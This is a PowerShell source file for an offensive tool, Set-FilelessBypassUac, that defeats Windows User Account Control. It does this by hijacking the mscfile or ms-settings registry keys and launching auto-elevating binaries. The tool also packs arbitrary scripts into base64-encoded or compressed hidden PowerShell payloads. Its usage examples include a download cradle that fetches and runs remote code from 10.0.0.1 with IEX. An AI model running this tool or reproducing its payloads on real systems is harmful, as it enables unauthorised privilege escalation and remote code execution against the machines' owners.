function Set-FilelessBypassUac {
<# 
.SYNOPSIS
    Bypass the Windows User Account Control (UAC) with fileless methods. 

    Author: Ricardo Ribeiro Tavares (@1RicardoTavares)
    License: BSD 3-Clause
	
    Required Dependencies: None
    Optional Dependencies: None
    

.DESCRIPTION
    Bypass the Windows User Account Control (UAC) with fileless methods. 
    
    Based on “Fileless” UAC Bypass Using eventvwr.exe and Registry Hijacking technique from Matt Nelson (@enigma0x3).
    https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/

    METHODS:

    - mscfile - Matt Nelson (@enigma0x3) method using CompMgmtLauncher.exe to replace eventvwr.exe.
        Working on:
        - Microsoft Windows 7;
        - Microsoft Windows 8;
        - Microsoft Windows 8.1;
        - Microsoft Windows 10 (UNTIL the build 15025.rs2)
        - Microsoft Windows 2008;
        - Microsoft Windows 2008 R2;
        - Microsoft Windows 2016.

    - ms-settings - NEW method using ms-settings registry key with DelegateExecute and fodhelper.exe.
        Working on:
        - Microsoft Windows 10 (tested with successful until the build 15031.rs2)
        - Microsoft Windows 2016.

    
.PARAMETER Method
    Methods used to bypass the Windows User Account Control (UAC):
        - ms-settings - Method using ms-settings registry key with DelegateExecute and fodhelper.exe (Working ONLY on Windows 10 and Windows 2016);
        - mscfile - Method using mscfile registry key with CompMgmtLauncher.exe. (Does not working on Windows 10 Build 15031.rs2).

.PARAMETER Option
    Used to choose what will be executed bypassing the UAC:
        - CommandLine - Run a command-line bypassing the UAC;
        - PowershellScript - Get the content from a powershel script file and generate a powershell command line with the source script encoded or compressed and prepared to bypassing UAC.
    
.EXAMPLE

    C:\PS> Set-FilelessBypassUac -Method ms-settings -Option CommandLine -CommandLine "cmd.exe"

    Description
    -----------
    Execute the command line "cmd.exe" bypassing the UAC using the mscfile method.

    
    C:\PS> Set-FilelessBypassUac -Method ms-settings -Option CommandLine -CommandLine "powershell.exe -nop -w hidden -c `$d=new-object net.webclient;`$d.proxy=[Net.WebRequest]::GetSystemWebProxy();`$d.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX `$d.downloadstring('http://10.0.0.1/report');"
    
    Description
    -----------
    Execute the powershell command line bypassing the UAC using the ms-settings method.
 

.EXAMPLE

    C:\PS> Set-FilelessBypassUac -Method ms-settings -Option PowershellScript -SourcePath .\psh_script.txt -DestinationPath .\psh_script_with_bypassUAC.txt
  
    Description
    -----------
    Get the content from a powershel script file psh_script.txt and generate a powershell command line inside of the file psh_script_with_bypassUAC.txt with the source script encoded or compressed and prepared to bypassing UAC.
    
    Example from the powershell script content:
    $n=new-object net.webclient;$n.proxy=[Net.WebRequest]::GetSystemWebProxy();$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $n.downloadstring('http://10.0.0.1/report');


.LINK
    https://github.com/1RicardoTavares/Offensive-PowerShell

#>

[CmdletBinding()]
    Param(        
        [parameter(Position=0,Mandatory=$true)]
        [validateset("mscfile","ms-settings" )]
        [string]$Method,  
        
        [parameter(Position=1,Mandatory=$true)]
        [validateset("CommandLine","PowershellScript" )]
        [string]$Option              
    )

    DynamicParam { 
        switch ($Option) {
           "CommandLine" {   
                $ParameterName1 = 'CommandLine'
                $ParameterAttribute1 = New-Object System.Management.Automation.ParameterAttribute
                $ParameterAttribute1.Mandatory = $true
                $ParameterAttribute1.Position = 0
                $AttributeCollection1 = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
                $AttributeCollection1.Add($ParameterAttribute1) 
                $RuntimeParameter1 = New-Object System.Management.Automation.RuntimeDefinedParameter($ParameterName1, [string], $AttributeCollection1)
                $RuntimeParameterDictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
                $RuntimeParameterDictionary.Add($ParameterName1, $RuntimeParameter1)
                return $RuntimeParameterDictionary
            }              
           "PowershellScript" {             
                $ParameterName2 = 'SourcePath'
                $ParameterAttribute2 = New-Object System.Management.Automation.ParameterAttribute
                $ParameterAttribute2.Mandatory = $true
                $ParameterAttribute2.Position = 0      
                $ValidateSetAttribute2 = New-Object System.Management.Automation.ValidateScriptAttribute({Test-Path $_})
                $AttributeCollection2 = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
                $AttributeCollection2.Add($ParameterAttribute2)
                $AttributeCollection2.Add($ValidateSetAttribute2) 
                $RuntimeParameter2 = New-Object System.Management.Automation.RuntimeDefinedParameter($ParameterName2, [string], $AttributeCollection2)
                
                $ValidPath = Test-Path $_ -IsValid  
                $ParameterName3 = 'DestinationPath'
                $ParameterAttribute3 = New-Object System.Management.Automation.ParameterAttribute
                $ParameterAttribute3.Mandatory = $true
                $ParameterAttribute3.Position = 1      
                $ValidateSetAttribute3 = New-Object System.Management.Automation.ValidateScriptAttribute({$ValidPath})
                $AttributeCollection3 = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
                $AttributeCollection3.Add($ParameterAttribute3)
                $AttributeCollection3.Add($ValidateSetAttribute3) 
                $RuntimeParameter3 = New-Object System.Management.Automation.RuntimeDefinedParameter($ParameterName3, [string], $AttributeCollection3)
                
                $RuntimeParameterDictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
                $RuntimeParameterDictionary.Add($ParameterName2, $RuntimeParameter2)
                $RuntimeParameterDictionary.Add($ParameterName3, $RuntimeParameter3)
                return $RuntimeParameterDictionary
            
            }
        }
    }

    Begin {         
        switch ($Method) {
            "mscfile" {
                $registry = 'mscfile'
                $trigger = 'CompMgmtLauncher.exe' 
            }
            "ms-settings" { 
                $registry = 'ms-settings'
                $trigger = 'fodhelper.exe'
            }
        }         
        switch ($Option) {
           "CommandLine" {
                $CommandLine = $PsBoundParameters[$ParameterName1]
            }
           "PowershellScript" {
                $SourcePath = $PsBoundParameters[$ParameterName2]
                $DestinationPath = $PsBoundParameters[$ParameterName3] 
                $FileContent = Get-Content $SourcePath
                $PayloadEnc = [System.Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($FileContent))
               
                if ($PayloadEnc.Length -le 8190) {
                    $Payload = "powershell.exe -nop -w hidden -exec bypass -ENC $PayloadEnc" 
                } ELSE {
                    Write-Host "The payload execeds the maximum allowed lenght (8190 characters)." -ForegroundColor Red
                    return 
                } 
            }   
        }

        $OS = (Get-CimInstance -ClassName CIM_OperatingSystem).Version
        $uacstatus = Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
        $registryPath = "HKCU:\SOFTWARE\Classes\$registry"
        $registrycmdPath = "HKCU:\SOFTWARE\Classes\$registry\shell\open\command"
        $triggerpath = Join-Path -Path ([System.Environment]::SystemDirectory) -ChildPath $trigger
    }

    Process {  
        switch ($Option) {
            "CommandLine"{
                If ($OS -notmatch "10" -and $Method -eq "ms-settings") {  
                    Write-Host "[!] The operationg system is not vulnerable to the selected technique. Choose another technique." -ForegroundColor Red
                } ELSE {
                    If (([bool]($(whoami /groups) -match "S-1-5-32-544")) -ne "True") {
                        Write-Host "[!] The current user not have admistrative rights." -ForegroundColor Red
                    } ELSE {
                        If (([bool]($(whoami /groups) -match "S-1-16-8192")) -ne "True") {
                            Write-Host "[!] The current user not have a MEDIUM integrity level." -ForegroundColor Red
                        } ELSE {
                            If($uacstatus.ConsentPromptBehaviorAdmin -Eq 2 -And $uacstatus.PromptOnSecureDesktop -Eq 1){
                                Write-Host "[!] UAC is configured to Always Notify and the bypassuac does not work." -ForegroundColor Red
    	                    } ELSE {
                                New-Item -Path $registrycmdPath -Force | Out-Null
                                New-ItemProperty -Path $registrycmdPath -Name "(Default)" -PropertyType STRING -Value $CommandLine -Force | Out-Null
                                New-ItemProperty -Path $registrycmdPath -Name "DelegateExecute" -PropertyType STRING -Force | Out-Null
                                Start-Process -FilePath $triggerpath
                                Sleep 1
                                Remove-Item -Path $registryPath -Recurse -Force
                            }
                        }
                    }
                }
            }  
   
            "PowershellScript" {
                $action= "If (([bool](`$(whoami /groups) -match 'S-1-5-32-544')) -ne 'True') { &$Payload } ELSE {" +
                "New-Item -Path $registrycmdPath -Force | Out-Null;New-ItemProperty -Path $registrycmdPath -Name '(Default)' -PropertyType STRING -"+
                "Value '$Payload' -Force | Out-Null;New-ItemProperty -Path $registrycmdPath -Name 'DelegateExecute' -P"+
                "ropertyType STRING -Force | Out-Null;Start-Process -FilePath $triggerpath;Sleep 1;Remove-Item -Path $registryPath -Recurse -Force}"
        
                $actionenc = [System.Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($action))
                if ($actionenc.Length -le 8190) {
                    $psscriptenc = "powershell -nop -w hidden -exec bypass -ENC $actionenc" 
                } ELSE {
                    $psscriptenc = "The payload execeds the maximum allowed lenght (8190 characters). Use the Compressed Payload"
                }  
                $ms = New-Object IO.MemoryStream
                $cs = New-Object IO.Compression.DeflateStream ($ms,[IO.Compression.CompressionMode]::Compress)
                $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
                $sw.WriteLine($action)
                $sw.Close()
                $actioncomp = [Convert]::ToBase64String($ms.ToArray())
                $psscriptcomp = "powershell -nop -w hidden -exec bypass Invoke-Expression `$(New-Object IO.StreamRead" +
                "er (`$(New-Object IO.Compression.DeflateStream (`$(New-Object IO.MemoryStream(,`$([Convert]" +
                "::FromBase64String('$actioncomp')))),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]" +
                "::ASCII)).ReadToEnd();"
                $payloadview = "`n CHOOSE THE PAYLOAD TO USE `n" + 
                "**************************`n"+
                "* --- BASE64 PAYLOAD --- *`n"+
                "**************************`n"+
                "$psscriptenc `n"+ 
                "**************************`n"+ 
                "* - COMPRESSED PAYLOAD - *`n"+ 
                "**************************`n"+
                "$psscriptcomp"
                Write-Host $payloadview
                Write-Output $payloadview | Out-File $DestinationPath -Encoding ascii
            }
        }  
    } 
}